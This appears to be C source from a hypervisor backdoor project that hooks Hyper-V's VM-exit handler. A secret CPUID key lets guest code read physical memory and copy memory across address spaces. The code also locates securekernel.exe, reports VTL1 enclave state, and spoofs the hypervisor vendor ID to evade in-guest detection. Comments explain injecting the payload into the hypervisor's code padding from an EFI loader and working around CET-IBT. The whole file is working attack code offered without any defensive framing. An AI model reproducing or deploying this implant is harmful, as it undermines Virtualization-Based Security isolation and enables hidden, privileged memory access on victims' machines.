#include "Global.h"
#include "VTX.h"

BOOLEAN CalledVmExitIntel = FALSE;
BOOLEAN CalledVtlReturnIntel = FALSE;

UINT64 OriginalVmExitHandlerIntelAddr = 0;
extern SECUREKERNEL_INFO SecureKernelInfo;
extern ENCLAVE_INFO EnclaveInfo;

COMMAND_DATA GetCommandIntel(const PGUEST_CONTEXT context)
{
    UINT64 guestCr3;
    __vmx_vmread(HOLY_VMCS_GUEST_CR3, &guestCr3);

    // CR3 contains other bits (like PCIDE), mask to get PFN and shift
    CR3 cr3;
    cr3.AsUInt = guestCr3;

    const UINT64 directoryBase = cr3.AddressOfPageDirectory << 12;
    const UINT64 commandPage = MemoryMapGuestVirtual(directoryBase, context->R8, MapSource);

    return *(COMMAND_DATA*)commandPage;
}

VOID SetCommandIntel(const PGUEST_CONTEXT context, COMMAND_DATA* data)
{
    UINT64 guestCr3;
    __vmx_vmread(HOLY_VMCS_GUEST_CR3, &guestCr3);

    CR3 cr3;
    cr3.AsUInt = guestCr3;

    const UINT64 directoryBase = cr3.AddressOfPageDirectory << 12;
    const UINT64 commandPage = MemoryMapGuestVirtual(directoryBase, context->R8, MapSource);

    *(COMMAND_DATA*)commandPage = *data;
}

VOID HandleCPUIDIntel(const PGUEST_CONTEXT context)
{
    COMMAND_DATA data;
    UINT64 guestCr3;
    __vmx_vmread(HOLY_VMCS_GUEST_CR3, &guestCr3);

    switch (context->Rdx)
    {
    case COMMAND_CHECK_PRESENCE:
        context->Rax = CPUID_RETURN_VALUE;
        break;
    case COMMAND_INIT_MEMORY:
        context->Rax = MemoryInit();
        break;
    case COMMAND_GET_CR3:
        context->Rax = guestCr3;
        break;
    case COMMAND_VIRTUAL_MEMORY_COPY:
        data = GetCommandIntel(context);
        context->Rax = MemoryCopyGuestVirtual(data.VirtualMemoryCopy.SourceCr3, data.VirtualMemoryCopy.SourceAddress, data.VirtualMemoryCopy.DestinationCr3, data.VirtualMemoryCopy.DestinationAddress, data.VirtualMemoryCopy.Size);
        break;
    case COMMAND_READ_PHYSICAL:
        data = GetCommandIntel(context);
        context->Rax = MemoryReadPhysical(data.ReadPhysical.PhysicalSourceAddress, data.ReadPhysical.Cr3, data.ReadPhysical.VirtualDestinationAddress, data.ReadPhysical.Size);
        break;
    case COMMAND_SECUREKERNEL_INFO:
        data.SecureKernelData.BaseVirtual = SecureKernelInfo.BaseAddressVirtual;
        data.SecureKernelData.BasePhysical = SecureKernelInfo.BaseAddressPhysical;
        data.SecureKernelData.Size = SecureKernelInfo.Size;
        data.SecureKernelData.CR3 = SecureKernelInfo.CR3;
        SetCommandIntel(context, &data);
        break;
    case COMMAND_ENCLAVE_INFO:
        data.EnclaveData.TotalCalls = EnclaveInfo.TotalCalls;
        data.EnclaveData.LastRip = EnclaveInfo.LastRip;
        data.EnclaveData.LastCR3 = EnclaveInfo.LastCR3;
        SetCommandIntel(context, &data);
        break;
    default:
        break;
    }
}

VOID HandleVTL1ToVTL0Intel(PGUEST_CONTEXT context)
{
    UINT64 guestCr3, guestRsp;
    __vmx_vmread(HOLY_VMCS_GUEST_CR3, &guestCr3);
    __vmx_vmread(HOLY_VMCS_GUEST_RSP, &guestRsp);

    const UINT64 rspPhysical = MemoryTranslateGuestVirtual(guestCr3, guestRsp, MapSource);
    if (!rspPhysical) {
        DebugFormat("Failed to translate RSP\n");
        return;
    }
    const UINT64 rspMapped = MemoryMapPage(rspPhysical, MapSource);

    const UINT64 returnAddress = *(UINT64*)rspMapped;
    const UINT64 returnPhysical = MemoryTranslateGuestVirtual(guestCr3, returnAddress, MapSource);
    if (!returnPhysical) {
        DebugFormat("Failed to translate return address\n");
        return;
    }

    UINT64 guestRip;
    __vmx_vmread(HOLY_VMCS_GUEST_RIP, &guestRip);

    DebugFormat("VTL1 to VTL0 transition (Intel):\n");
    DebugFormat(" - RIP: 0x%p\n", guestRip);
    DebugFormat(" - RSP: 0x%p\n", guestRsp);
    DebugFormat(" - CR3: 0x%p\n", guestCr3);
    DebugFormat(" - Stack physical: 0x%p\n", rspPhysical);
    DebugFormat(" - Stack mapped: 0x%p\n", rspMapped);
    DebugFormat(" - Return virtual: 0x%p\n", returnAddress);
    DebugFormat(" - Return physical: 0x%p\n", returnPhysical);

    UINT64 currentPagePhysical = returnPhysical & ~0xFFF;
    const UINT64 searchLimit = 1024 * 1024 * 64; // 64mb
    UINT64 searchCount = 0;

    while (searchCount < searchLimit)
    {
        const UINT64 currentPageMapped = MemoryMapPage(currentPagePhysical, MapSource);
        const PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)currentPageMapped;
        if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE)
        {
            if (dosHeader->e_lfanew > 0 && dosHeader->e_lfanew < 4096 - sizeof(IMAGE_NT_HEADERS))
            {
                const PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((UINT64)dosHeader + dosHeader->e_lfanew);
                if (ntHeaders->Signature == IMAGE_NT_SIGNATURE)
                {
                    DebugFormat("Found securekernel.exe:\n");
                    DebugFormat(" - Base virtual: 0x%p\n", ntHeaders->OptionalHeader.ImageBase);
                    DebugFormat(" - Base physical: 0x%p\n", currentPagePhysical);
                    DebugFormat(" - Checksum: 0x%x\n", ntHeaders->OptionalHeader.CheckSum);
                    DebugFormat(" - Size of image: 0x%x\n", ntHeaders->OptionalHeader.SizeOfImage);

                    SecureKernelInfo.BaseAddressVirtual = ntHeaders->OptionalHeader.ImageBase;
                    SecureKernelInfo.BaseAddressPhysical = currentPagePhysical;
                    SecureKernelInfo.Size = ntHeaders->OptionalHeader.SizeOfImage;
                    SecureKernelInfo.CR3 = guestCr3;
                    break;
                }
            }
        }

        currentPagePhysical -= 4096;
        searchCount += 4096;
    }

    if (searchCount >= searchLimit)
    {
        DebugFormat("No image was found\n");
        return;
    }
}

#include "HolyProtocol.h"

//
// VMEXIT layout (confirmed against this build of hvix64.exe via IDA + probes):
//
//   sub_2118A0(DISPATCHER_CTX *ctx, uint32_t status)
//
//   ctx (= rcx at function entry) is a small dispatcher wrapper.
//   *ctx (first qword) is a pointer to the guest GPR save area, laid out as:
//     [+0x00] = guest RAX     [+0x40] = guest R8
//     [+0x08] = guest RCX     [+0x48] = guest R9
//     [+0x10] = guest RDX     ...
//     [+0x18] = guest RBX     [+0x78] = guest R15
//
// Protocol (see HolyProtocol.h) -- trigger:
//   CPUID with RCX == HOLY_KEY and RAX == HOLY_CMD_*.
//
// The hook must contain NO indirect branches (CET-IBT). Our payload's .data
// is copied into hv's .text padding which is RX, so any write to a payload
// global would page-fault. Instead, the EFI side fills g_HolyScratch with
// the address of one page of hv .data padding (RW in hv's own PT) before
// CopyMem; we only ever READ g_HolyScratch here, then WRITE through it.
//
// Vendor-ID spoof on CPUID(0x40000000) makes ours appear as "HolyHv Backd"
// to any in-guest detector probing for a hypervisor.
//

// g_HolyScratch lives in our payload's .data. Defined below so it lands in
// the copied PE; the EFI side overwrites it pre-CopyMem with the address of
// one RW page inside hv's .data padding.
extern UINT64 g_HolyScratch;

UINT64 HookedVmExitHandlerIntel(PGUEST_CONTEXT context, VOID* unknown)
{
    (VOID)unknown;

    UINT64 exitReason = 0;
    __vmx_vmread(HOLY_VMCS_EXIT_REASON, &exitReason);
    if ((exitReason & 0xFFFFu) != 10) return 0;   // not CPUID -> pass through

    if ((UINT64)context <= 0x1000ull) return 0;
    UINT64* gprs = *(UINT64**)context;
    if ((UINT64)gprs <= 0x1000ull) return 0;

    // Hypervisor Vendor ID spoofing (CPUID leaf 0x40000000)
    if ((UINT32)gprs[0] == 0x40000000u) {
        gprs[0] = 0x40000000u; // Max CPUID leaf
        gprs[3] = 0x796C6F48u; // "Holy" (EBX)
        gprs[1] = 0x42207648u; // "Hv B" (ECX)
        gprs[2] = 0x646B6361u; // "ackd" (EDX)

        UINT64 rip = 0, len = 0;
        __vmx_vmread(HOLY_VMCS_GUEST_RIP, &rip);
        __vmx_vmread(HOLY_VMCS_VMEXIT_INSTRUCTION_LENGTH, &len);
        __vmx_vmwrite(HOLY_VMCS_GUEST_RIP, rip + len);
        return 1;
    }

    if ((UINT32)gprs[1] != HOLY_KEY) return 0;     // not our backdoor

    // Update bookkeeping in our hv .data scratch (RW).
    HOLY_SCRATCH* scratch = (HOLY_SCRATCH*)g_HolyScratch;
    if (scratch) {
        if (scratch->magic != HOLY_SCRATCH_MAGIC) {
            scratch->magic = HOLY_SCRATCH_MAGIC;
            scratch->vmexit_count = 0;
        }
        scratch->vmexit_count++;
        scratch->last_exit_reason = exitReason & 0xFFFFu;
        __vmx_vmread(HOLY_VMCS_GUEST_RIP, &scratch->last_guest_rip);
    }

    const UINT32 cmd = (UINT32)gprs[0];
    UINT64 outA = 0, outB = 0, outC = 0;
    UINT32 status = HOLY_STATUS_OK;

    switch (cmd) {
        case HOLY_CMD_PING:
            outA = 0xC0FFEE01ull;
            outB = 0xCAFEBABEull;
            outC = 0xFEEDFACEull;
            break;

        case HOLY_CMD_GET_CR3:
            __vmx_vmread(HOLY_VMCS_GUEST_CR3, &outA);
            break;

        case HOLY_CMD_GET_HOOK_RVA:
            outA = (UINT64)OriginalVmExitHandlerIntelAddr;
            break;

        case HOLY_CMD_GET_VMEXIT_COUNT:
            outA = scratch ? scratch->vmexit_count     : 0;
            outB = scratch ? scratch->last_exit_reason : 0;
            outC = scratch ? scratch->last_guest_rip   : 0;
            break;

        case HOLY_CMD_GET_SCRATCH:
            outA = g_HolyScratch;
            outB = sizeof(HOLY_SCRATCH);
            outC = scratch ? scratch->magic : 0;
            break;

        default:
            status = HOLY_STATUS_UNKNOWN_CMD;
            break;
    }

    gprs[0] = (UINT64)status;
    gprs[3] = outA;
    gprs[1] = outB;
    gprs[2] = outC;

    UINT64 rip = 0, len = 0;
    __vmx_vmread(HOLY_VMCS_GUEST_RIP, &rip);
    __vmx_vmread(HOLY_VMCS_VMEXIT_INSTRUCTION_LENGTH, &len);
    __vmx_vmwrite(HOLY_VMCS_GUEST_RIP, rip + len);
    return 1;
}

// Definition: lands in our payload's .data so it travels with CopyMem.
// EFI side overwrites this pre-CopyMem.
UINT64 g_HolyScratch = 0;
